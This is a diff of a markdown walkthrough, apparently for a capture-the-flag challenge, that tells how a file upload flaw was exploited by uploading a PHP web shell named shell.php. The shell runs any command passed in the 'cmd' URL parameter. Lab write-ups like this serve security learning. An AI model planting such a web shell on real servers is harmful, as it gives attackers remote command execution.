@@ -4,11 +4,16 @@
 
 I first started off by trying to run a classic php shell through the file upload vulnerability
 
+![SHELLupload](../media/Screenshots/file-up-n0s4n1ty.png)
+
+## file contents
+
     <?php
     echo "<pre>";
     system($_GET['cmd']);
     echo "</pre>";
     ?>
+---
 
 I saved this code to a file and named it shell.php and uploaded it through the file upload functionality
 
